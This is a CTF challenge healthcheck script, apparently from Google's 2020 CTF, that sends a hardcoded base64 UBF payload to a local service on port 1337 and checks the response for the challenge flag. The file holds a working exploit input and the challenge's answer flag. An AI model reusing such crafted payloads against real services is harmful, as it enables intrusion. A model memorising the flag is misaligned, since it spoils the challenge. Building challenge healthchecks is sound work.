#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes

solution = bytes("AAIAAHMBAAIABQAkTU9URAACAABzAQACAAUAJFRFQU0AAgAAcwEAAgAFACRGTEFHAAIAAHMBAAIABQAkRkxBRwACAABzAQACAAUAJEZMQUcAAgAAcwEAAgAFACRGTEFHAAIAAHMBAAIABQAkRkxBRwACAABzAQACAAUAJEZMQUcAAgAAcwEAAgAFACRGTEFHAAIAAHMBAAIABQAkRkxBRwACAABzAQACAAUAJEZMQUcAAgAAcwEAAgAFACRGTEFHAAIAAHMBAAIABQAkRkxBRwACAABzAQACAAUAJEZMQUcAAgAAYgEAw/0B", encoding="utf-8")
flag_contents = "{Respl3nd4nt-C0nd1tion@l-El3ments}"

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
r.recvuntil(bytes("Enter UBF data base64 encoded:", encoding="utf-8"))
r.sendline(solution)

# We will get multiple censored flags e.g. CTF{XXXXX} and the actual result
# will be mangeld: C\1F{<flag>}
response = r.recvall().decode("utf-8")

print(response);

if flag_contents in response:
  print("Health check successful!")
  exit(0)

print("Health check failed!! Flag not found")
exit(-1)
